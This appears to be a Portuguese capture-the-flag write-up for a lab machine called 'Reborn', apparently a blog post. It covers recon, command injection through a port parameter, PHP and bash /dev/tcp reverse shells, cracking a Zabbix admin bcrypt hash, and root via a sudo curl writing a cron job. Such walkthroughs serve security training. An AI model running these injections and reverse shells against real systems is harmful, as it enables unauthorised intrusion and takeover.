<h1>Reborn</h1>
<img src="posts/reborn/reborn.png" alt="Reborn image" />

<div class="post-meta">
  <span>üìÖ Oct 1, 2025</span>
  <span>üè∑Ô∏è Hacking Club</span>
</div>
<hr>
<div class="post-body">
  <h2>Descoberta de aplicativo web</h2>
  <p>Quando tentamos acessar o web service, somos redirecionados para <code>reborn.hc</code>. Precisamos acrescentar isso em nosso <code>/etc/hosts</code> arquivo:</p>
  <pre><code>curl -I http://$IP</code></pre>
  <pre><code>echo "$IP reborn.hc" | sudo tee -a /etc/hosts</code></pre>

  <h2>Reconhecimento</h2>
  <h3>Varedura de portas</h3>
  <p>O <code>nmap</code> foi utilizado para mapear portas e servi√ßos ativos na m√°quina alvo. O scan revelou apenas duas portas abertas:</p>
  <pre><code>nmap -sC -sV -oA reborn.hc</code></pre>
  <h4>Resultado:</h4>
  <pre><code>22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)</code></pre>

  <h2>Analisando o aplicativo web</h2>
  <h3>Fuzzing de diret√≥rios</h3>
  <p>Vamos realizar a enumera√ß√£o de hosts virtuais para descobrir subdom√≠nios ocultos:</p>
  <pre><code>ffuf -w /path/to/wordlists -u http://TARGET/FUZZ</code></pre>
  <h4>Resultado:</h4>
  <pre><code>reborn.hc/index.php</code></pre>
  <p>Acessando o <strong>index.php</strong> no aplicativo web somos redirecionados para um checador de websites, que utiliza comunica√ß√£o HTTP/HTTPS com o output rodando <code>curl</code> internamente.</p>
  <img src="posts/reborn/web.png" alt="Web fuzzing result" />

  <h2>Explorando a vulnerabilidade</h2>
  <h3>Command Injection</h3>
  <p>Campo Website URL √© concatenado numa chamada de sistema (ex.: <code>curl</code>) sem valida√ß√£o/sanitiza√ß√£o, permitindo inje√ß√£o de comandos.</p>
  <pre><code>http://127.0.0.1;curl file:///var/www/html/index.php</code></pre>
  <img src="posts/reborn/command.png" alt="Command injection" />

  <h3>Analisando o conte√∫do do arquivo index.php</h3>
  <p>Analisando as primeiras linhas de c√≥digo, percebemos que a vari√°vel <code>$expertMode</code> √© acess√≠vel atrav√©s da URL se o par√¢metro GET <code>expertMode</code> existir e se seu valor for exatamente <strong>tcp</strong>.</p>
  <img src="posts/reborn/url.png" alt="">
  <br>
  <img src="posts/reborn/tcp.png" alt="Expert Mode" />
  <p>Analisando o index novamente, vemos que <code>escapeshellarg($ip)</code> coloca o IP entre aspas e escapa caracteres perigosos, ent√£o o IP fica seguro contra inje√ß√£o.<br>
  A porta (<code>$port</code>) √© concatenada sem sanitiza√ß√£o, portanto um atacante pode injetar operadores de shell (<code>;</code>, <code>&&</code>, <code>|</code>, etc.) ou outras cargas √∫teis atrav√©s do campo port.</p>
  <img src="posts/reborn/vuln.png" alt="Vulnerability analysis" />

  <h3>Reverse Shell</h3>
  <p>Aproveitando o input (<code>$port</code>) onde n√£o faz o <code>escapeshellarg</code>.</p>
  <pre><code>php -r '$sock=fsockopen('$IP',PORT);exec('sh <&3 >&3 2>&3');'</code></pre>
  <img src="posts/reborn/reverse.png" alt="Reverse shell" />

  <h3>Zabbix</h3>
  <p>Acessando arquivo de configura√ß√£o do banco de dados Zabbix.</p>
  <img src="posts/reborn/confzabbix.png" alt="Zabbix configuration" />
  <p>Credenciais de acesso ao banco de dados rodando localmente.</p>
  <img src="posts/reborn/confaccess.png" alt="Zabbix credentials" />
  <p>Query SQL na tabela users para obter credenciais de administrador.</p>
  <img src="posts/reborn/users.png" alt="Users table" />
  <p>Hash do tipo Bcrypt. Utilizamos o m√≥dulo 3200 do hashcat para quebrar a senha.</p>
  <pre><code>hashcat -m 3200 hash wordlist</code></pre>
  <img src="posts/reborn/hash.png" alt="Hashcat cracking" />

  <h3>Explorando o painel de administra√ß√£o do Zabbix</h3>
  <p>Acessando <code>http://reborn.hc/zabbix</code>.</p>
  <img src="posts/reborn/painel.png" alt="Zabbix panel" />
  <p>Alterando o script ping para a reverse shell.</p>
  <pre><code>php -r '$sock=fsockopen('$IP',PORT);exec('sh <&3 >&3 2>&3');'</code></pre>
  <img src="posts/reborn/reversezabbix.png" alt="Reverse shell via Zabbix" />
  <p>Clicando em <strong>Monitoring > Hosts</strong>, executamos o ping.</p>
  <img src="posts/reborn/scriptping.png" alt="Ping script" />
  <p>Capturamos a primeira flag.</p>
  <img src="posts/reborn/flag1.png" alt="First flag" />

  <h2>Escalando privil√©gios</h2>
  <h3>Permiss√µes</h3>
  <p>Verificando as permiss√µes de sudo do usu√°rio <code>vito</code>.</p>
  <pre><code>sudo -l</code></pre>
  <img src="posts/reborn/permissao.png" alt="Sudo permissions" />
  <p>Se o bin√°rio tiver permiss√£o para ser executado como superusu√°rio por sudo, ele n√£o perder√° os privil√©gios elevados e poder√° ser usado para acessar o sistema de arquivos, escalar ou manter o acesso privilegiado.</p>
  <pre><code>echo "* * * * * root bash -c 'bash -i >& /dev/tcp/$IP/PORT 0>&1'" > cron_pwn</code></pre>
  <img src="posts/reborn/arqcron.png" alt="Cron job for privilege escalation" />
  <p>Subindo servidor localmente.</p>
  <img src="posts/reborn/serverpy.png" alt="">
  <h3>Obtendo shell de root.</h3>
  <pre><code>sudo /usr/bin/curl -fsSL http://$IP:$PORTnome_arq -o /etc/cron.d/nome_arq</code></pre>
  <p><b>sudo</b> ‚Üí Executa o comando com privil√©gios de superusu√°rio.
    <br>
    <b>/usr/bin/curl</b> ‚Üí Usa o curl para baixar um arquivo de uma URL.
    <br>
    <b>-fsSL</b> ‚Üí Op√ß√µes do curl:
    <br>
    <b>-f:</b> falhar silenciosamente em erros HTTP.
    <br>
    <b>-s:</b> modo silencioso (sem progresso).
    <br>
    <b>-S:</b> mostra erros mesmo em modo silencioso.
    <br>
    <b>-L:</b> segue redirecionamentos.
    <br>
    <b>http://10.0.73.93:8080/cron_pwn</b> ‚Üí URL onde est√° o arquivo a ser baixado.
    <br>
    <b>-o /etc/cron.d/pwn</b>‚Üí Salva o arquivo baixado no diret√≥rio /etc/cron.d/ com o nome pwn.</p>
  <h3>O que isso faz no sistema:</h3>
  <p>Baixa remotamente um arquivo chamado cron_pwn e o coloca no diret√≥rio /etc/cron.d/, que √© usado para configurar tarefas agendadas no cron. Todas as tarefas s√£o executadas a cada um minuto. Isso significa que o arquivo baixado provavelmente cont√©m uma tarefa cron que ser√° executada automaticamente com privil√©gios de root.</p>
  <img src="posts/reborn/curlall.png">
  <p>Agora nos tornamos root e capturamos a segunda flag.</p>
  <img src="posts/reborn/flag2.png" alt="">
</div>
